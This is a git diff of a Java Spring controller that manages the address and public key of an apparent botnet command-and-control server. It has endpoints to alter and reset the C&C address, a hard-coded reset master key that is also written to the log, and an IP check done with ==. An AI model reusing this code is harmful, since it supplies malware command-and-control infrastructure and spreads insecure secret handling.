@@ -22,12 +22,19 @@ import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
 
 @Controller
 public class DNSController {
 
 	public PublicKey pubKey;
 	private String resetMasterKey = "1TpUXuLLNrC9p7q7QLtJxjurK8ALQ4VJJXh10qsUh9qrO57G5Gmy9xGHYO7lO2fbw3YKmA2ii8J0Tkk6QqVDOHjmyNFbGV2MmZW9ji3lxmH53EOhGAwHeXmWcJCr36Z0KbO67EWtT6QX2W28jx9bgZ2AXkWzfbAT4rnlptmaT5f2DN28FT1KKmAEicW035nWZRy9enilNuihoUKczn3Sme548EKmDoGWCl0BXJKMpeAlrZ802oD7ZqiNs9IJLw8VC0qs2F6aOXB1GB4foGCW33PMHpkyXuh0BRxWtnqBgiJC5rivNJEIfISOOcMWRI8sQUTDSaIHjIWGUE0YeNxMVItYMo6rmaUvEI8v0UHaorSHT80vaIgr0YngWNjlNBcAMF2QZTDkRxLaF1lcbnT7VYjzaBCy7niyYgSKkWNicPZb59ITqsoqeLAG1qtTDWRBt9lylfNMrwwnLy0TZIPIt3hYNJUZV9SoJCJ1LzEoe4kH6VHk4v1VnJGOooyBFfFmx109TycUqS0hTzDm7TX3EVkQb6bq7mtApBHWkCam2BI6Lf056QrRDyV6tfMl5SXVlMJpX5sKJVB2DGnssujT6F0iGrgsf6LQYXnM5yy24arzaqSzAtiFHb6bW6V6RaIzZ0jcuIzKH77jE7XUUUxlpg5vPmSDCXJ5T8R5o8Dj3gvilHAiHsvttnwF87kjiftfWvjnrAk9qPhVYZuSJtFxWODTXhxUuTzHfx6tn87biAEbo0G89o0h4qj2XI0gvevgOf6Q5s1xqX7Rfv3kC9ODHzWFmgZBv2i93tPsm9O3vsfawiFVaSbiM8eKs1WUzU92bHt5tllUSxr0EpZHRGaeYvy6zv3oSYjS6aCxSo9f7qtsFjcsr8oDRs3aSnxLLVZFT1qKT0I9ppwWR4jOoTSQH3EF2ORVDziDxRi91W7pGjPjeBR63AGIMczFB0Jp6Z0DmQkZZmPuCrGjALiL0pZcjnMbQB2g29QI1HZPyGf4ujar3JA7Ds5ru0xByLxPzUb0";
+	
+	private IP defaultCCIp = new IP("192.168.0.38");
+	private PublicKey defaultCCPubKey;
+	private Boolean flag = true;
+	
 	
 	@Autowired
 	public IP ipCec;
@@ -51,6 +58,7 @@ public class DNSController {
 	}
 
 	@RequestMapping(value = "/alter", method = RequestMethod.POST)
+	@ResponseBody
 	public Boolean alter(@RequestBody Pairs<IP, String> cec, HttpServletRequest req) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException {
 		if (req.getRemoteAddr() == ipCec.getIp()) {
 			KeyFactory fact = KeyFactory.getInstance("RSA", "BC");
@@ -58,6 +66,12 @@ public class DNSController {
 			pubKey = fact.generatePublic(new X509EncodedKeySpec(encoded));
 			ipCec.setIp(cec.getValue1().toString());
 			System.out.println("C&C updated correctly.");
+			if (flag) {
+				System.out.println("First access: setting default values.");
+				defaultCCIp = ipCec;
+				defaultCCPubKey = pubKey;
+				flag = false;
+			}
 			return true;
 		} else {
 			System.out.println("ALTER failed.");
@@ -65,21 +79,21 @@ public class DNSController {
 		}
 	}
 	
-	//TODO è diventato post così sparisce 200 e la pagina non è contattabile
-	//TODO ognuno dovrebbe avere la coppia di default encodada e me la manda al reset
 	@RequestMapping(value = "/reset", method = RequestMethod.POST)
-	public Boolean reset(@RequestBody String resetKey, @RequestBody Pairs<IP, String> cec, HttpServletRequest req){
+	@ResponseBody
+	public Boolean reset(@RequestBody String resetKey, HttpServletRequest req){
+		System.out.println(resetKey);
 		if(resetKey.equals(resetMasterKey)){
-			//TODO incolla da sopra keyfactory, byte, pubkey
-			//ipCec.setIp(defaultIp);
-			//pubKey = defaultKey;
+			ipCec = defaultCCIp;
+			pubKey = defaultCCPubKey;
 			System.out.println("C&C resettato da " + req.getRemoteAddr() + ":" + req.getRemotePort());
 			return true;
-			// qui tornava 200, sotto 404
 		} else {
 			System.out.println("RESET failed.");
 			return false;
 		}
 	}
+	
+	
 
 }
